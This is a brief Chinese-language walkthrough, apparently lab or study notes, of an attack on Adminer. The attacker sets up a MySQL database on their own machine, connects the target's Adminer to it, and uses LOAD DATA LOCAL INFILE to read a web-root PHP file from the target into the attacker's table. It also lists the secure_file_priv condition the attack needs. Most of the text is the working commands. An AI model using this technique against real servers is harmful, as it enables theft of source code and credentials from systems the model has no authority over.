攻击机新建库和表，开启外连

create database adminer;

use adminer;

create table test(text text(4096));

访问靶机，输入攻击机的数据库信息

靶机需要 secure_file_priv 为空，为 null 导出不了

执行命令

load data local infile "C:\\phpstudy_pro\\WWW\\1.php" into table test FIELDS TERMINATED BY '\n';
